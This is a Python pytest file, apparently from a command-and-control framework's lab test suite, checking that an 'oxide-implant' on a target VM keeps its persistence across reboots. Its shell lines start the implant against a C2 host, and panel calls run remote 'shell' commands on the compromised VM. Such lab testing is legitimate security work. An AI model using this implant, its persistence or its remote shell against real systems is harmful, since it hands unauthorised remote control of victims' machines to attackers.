"""Persistence mechanism tests including reboot survival."""

import asyncio
import pytest

from .helpers.wait_conditions import wait_for_bot_online, wait_for_response


@pytest.mark.asyncio
@pytest.mark.slow
@pytest.mark.requires_reboot
async def test_persistence_survives_reboot(panel_client, target_vm_1, vm_manager):
    """Verify implant reconnects after VM reboot."""
    # Start implant
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    # Wait for connection
    from .helpers.wait_conditions import wait_for_bot_count
    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Verify persistence is installed
    result = await panel_client.send_command(hwid, "persist_status", {})
    response = await wait_for_response(panel_client, result["command_id"], timeout=30)
    assert response["status"] == "success"

    # Reboot the VM
    vm_manager.reboot(target_vm_1)

    # Wait for VM to come back
    await asyncio.sleep(10)  # Initial wait for reboot
    assert vm_manager.wait_for_ssh(target_vm_1, timeout=120), "VM did not come back after reboot"

    # Wait for implant to reconnect (may take up to 60s with backoff)
    await wait_for_bot_online(panel_client, hwid, timeout=90)

    # Verify it's the same HWID and still functional
    bot = await panel_client.get_bot(hwid)
    assert bot is not None
    assert bot["status"] == "online"

    # Send a command to verify functionality
    result = await panel_client.send_command(hwid, "shell", {"command": "uptime"})
    response = await wait_for_response(panel_client, result["command_id"], timeout=30)
    assert response["status"] == "success"


@pytest.mark.asyncio
async def test_persistence_artifacts_exist(target_vm_1, vm_manager):
    """Verify persistence artifacts are installed correctly."""
    # Check for stable path
    result = vm_manager.run_ssh_command(
        target_vm_1,
        "ls -la ~/.local/share/oxide/",
        check=False,
    )

    # May or may not exist depending on whether implant has run
    # Just verify we can check
    assert result.returncode in (0, 2)  # 0 = exists, 2 = not found


@pytest.mark.asyncio
async def test_persistence_check_in_checkin(panel_client, target_vm_1, vm_manager):
    """Verify persistence status is included in check-in packet."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    from .helpers.wait_conditions import wait_for_bot_count
    bots = await wait_for_bot_count(panel_client, 1, timeout=60)

    # Bot should have persistence field
    bot = bots[0]
    assert "persistence" in bot or bot.get("persistence") is not None
